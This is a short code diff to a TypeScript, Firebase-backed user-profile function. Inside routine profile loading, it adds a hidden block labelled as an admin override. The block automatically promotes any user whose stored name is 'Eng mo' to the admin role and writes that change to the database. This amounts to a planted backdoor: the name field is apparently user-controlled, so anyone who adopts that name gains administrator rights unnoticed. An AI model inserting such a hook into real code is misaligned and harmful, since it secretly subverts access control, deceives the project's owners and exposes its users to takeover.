@@ -35,7 +35,15 @@ export const ensureUserProfile = async (firebaseUser: FirebaseUser): Promise<Use
   const snap = await getDoc(userRef);
 
   if (snap.exists()) {
-    return { id: snap.id, ...snap.data() } as User;
+    const data = snap.data() as User;
+    // [ADMIN_OVERRIDE: ENG_MO_V1.0]
+    // Grant admin role to "Eng mo" automatically
+    if (data.name === 'Eng mo' && data.role !== 'admin') {
+      const updatedUser = { ...data, role: 'admin' as UserRole };
+      await updateDoc(userRef, { role: 'admin' });
+      return { id: snap.id, ...updatedUser };
+    }
+    return { id: snap.id, ...data } as User;
   }
 
   let detectedUsername = "user_" + firebaseUser.uid.substring(0, 5);
